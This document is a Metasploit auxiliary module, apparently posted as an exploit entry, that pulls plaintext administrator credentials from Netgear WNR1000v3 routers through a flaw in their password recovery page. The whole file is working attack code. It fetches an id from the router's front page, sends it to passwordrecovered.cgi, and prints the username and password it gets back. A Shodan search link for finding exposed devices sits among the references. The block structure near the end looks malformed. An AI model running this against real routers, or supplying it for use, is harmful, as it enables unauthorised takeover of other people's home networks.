#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# Exploit Title: Netgear WNR1000v3 Password Recovery Credential Disclosure Vulnerability
# Date: 7-5-14
# Exploit Author: c1ph04
# Vendor Homepage: http://www.netgear.com/
# Version: 1.0
# Tested on: Netgear WNR1000v3 Router Version: <= 1.0.2.62_60.0.87

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(

      'Name'        => 'Netgear WNR1000v3 Password Extractor',

      'Description' => %q{
          This module exploits a vulnerability in the password recovery feature of certain Netgear WNR1000v3 routers.
          Affected devices will allow retrieval of the plaintext administrator credentials.
          Vulnerable Versions: <= 1.0.2.62_60.0.87
       },

      'References'  =>
        [
          [ 'URL', 'http://c1ph04text.blogspot.com/2014/01/mitrm-attacks-your-middle-or-mine.html' ],
          [ 'URL', 'http://packetstormsecurity.com/files/124759/NETGEAR-WNR1000v3-Password-Disclosure.html' ],
          [ 'URL', 'http://secunia.com/community/advisories/56330' ],
          [ 'URL', 'http://www.shodanhq.com/search?q=WNR1000v3' ]
        ],

      'Author'      =>
        [
          'c1ph04 <c1ph04mail[at]gmail.com>' # aka - "Ms. Difrank"...idiots
        ],
      'License'     => MSF_LICENSE
    )
  end

  def run

    print_status("#{rhost}:#{rport} - Attempting to extract credentials...")

    begin

      res = send_request_raw({
        'uri' => '/',
        'method' => 'GET'
        })

      if (res.body =~ /(id)/)
        uid = res.body.scan(/\d{5,15}/)
        uid = uid[0]
        print_good("#{rhost}:#{rport} - UID Retrieved: #{uid}")
        print_good("#{rhost}:#{rport} - Sending Request...")

      else
        print_error("Unexpected response...is this a Netgear Router?")
        return

      end

      res2 = send_request_raw({
        'uri' => "/passwordrecovered.cgi?id=#{uid}",
        'method' => 'POST'
        })

        if (res2.body =~ /(successfully)/)
          creds = res2.body.scan(/left">(.*)</)
          user = creds[0]
          pass = creds[1]
          print_good("#{rhost}:#{rport} - Username: #{user}")
          print_good("#{rhost}:#{rport} - Password: #{pass}")

        else
          print_error("#{rhost}:#{rport} - Failed: Target Not Vulnerable")

        end
       end
      end

    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return

    end